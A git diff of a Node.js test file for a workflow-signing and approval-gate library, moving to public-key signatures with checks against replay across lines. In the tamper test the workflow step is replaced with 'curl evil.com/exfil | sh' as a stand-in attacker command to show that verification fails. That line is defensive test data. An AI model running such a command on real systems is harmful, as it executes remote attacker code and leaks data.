@@ -5,10 +5,12 @@ import { join } from "node:path";
 import { test } from "node:test";
 
 import { ApprovalGateManager, signWorkflow, verifyWorkflow } from "../lib/runner.mjs";
+import { newAdminKey } from "../lib/admin.mjs";
 
 test("Workflow signing: detects tampering and verifies valid admin signatures", async () => {
-  const adminSecret = "super-secret-chamber-admin-key-32b";
-  const attackerSecret = "attacker-secret-key-0123456789abc";
+  const admin = newAdminKey();
+  const attacker = newAdminKey();
+  const lineId = "testline1234567890abcdef12345678";
 
   const workflow = `
 name: verify-patch
@@ -18,32 +20,38 @@ steps:
     run: git apply --check
   `;
 
-  // 1. Sign workflow with admin key
-  const signed = await signWorkflow(workflow, adminSecret);
+  // 1. Sign workflow with admin private key and domain separation
+  const signed = signWorkflow(workflow, admin.private, { lineId });
   assert.match(signed, /^# chamber-signature: [A-Za-z0-9_-]+\n/);
 
-  // 2. Verify with correct admin key
-  const validCheck = await verifyWorkflow(signed, adminSecret);
+  // 2. Verify with pinned admin public key
+  const validCheck = verifyWorkflow(signed, admin.public, { lineId });
   assert.equal(validCheck.valid, true);
   assert.match(validCheck.body, /name: verify-patch/);
 
-  // 3. Verify fails if verified with attacker key
-  const invalidCheck = await verifyWorkflow(signed, attackerSecret);
+  // 3. Verify fails if verified with attacker's public key
+  const invalidCheck = verifyWorkflow(signed, attacker.public, { lineId });
   assert.equal(invalidCheck.valid, false);
+  assert.match(invalidCheck.error, /Signature verification failed/);
 
-  // 4. Tampering detection: attacker modifies workflow step
+  // 4. Verify fails if lineId mismatches (replay across chambers prevented)
+  const lineMismatchCheck = verifyWorkflow(signed, admin.public, { lineId: "otherline9876543210fedcba87654321" });
+  assert.equal(lineMismatchCheck.valid, false);
+  assert.match(lineMismatchCheck.error, /line mismatch/);
+
+  // 5. Tampering detection: attacker modifies workflow step
   const tampered = signed.replace("git apply --check", "curl evil.com/exfil | sh");
-  const tamperedCheck = await verifyWorkflow(tampered, adminSecret);
+  const tamperedCheck = verifyWorkflow(tampered, admin.public, { lineId });
   assert.equal(tamperedCheck.valid, false);
 });
 
-test("ApprovalGateManager: manages lifecycle, tokens, and expirations", () => {
+test("ApprovalGateManager: manages lifecycle, tokens, and expirations", async () => {
   const tmp = mkdtempSync(join(tmpdir(), "chamber-gates-"));
   const mgr = new ApprovalGateManager(tmp);
 
   try {
     // 1. Create a gate
-    const gate = mgr.createGate({
+    const gate = await mgr.createGate({
       description: "Deploy to production",
       action: "deploy:prod",
       requestedBy: "ashish/codex",
